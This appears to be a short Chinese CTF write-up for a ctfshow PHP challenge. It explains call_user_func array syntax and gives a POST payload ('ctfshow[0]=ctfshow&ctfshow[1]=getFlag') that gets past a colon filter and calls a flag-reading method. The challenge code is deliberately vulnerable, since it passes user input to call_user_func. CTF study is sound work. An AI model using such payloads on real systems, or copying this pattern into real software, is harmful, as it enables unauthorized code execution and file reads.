# 知识点
### call_user_func数组调用类方法
```python
<?php

class myclass {
    static function say_hello()
    {
        echo "Hello!\n";
    }
}

$classname = "myclass";

call_user_func(array($classname, 'say_hello')); //通过数组调用类静态方法
call_user_func($classname .'::say_hello');

$myobject = new myclass();

call_user_func(array($myobject, 'say_hello'));

?>
```
# 思路
```python
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);


```
```python
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```
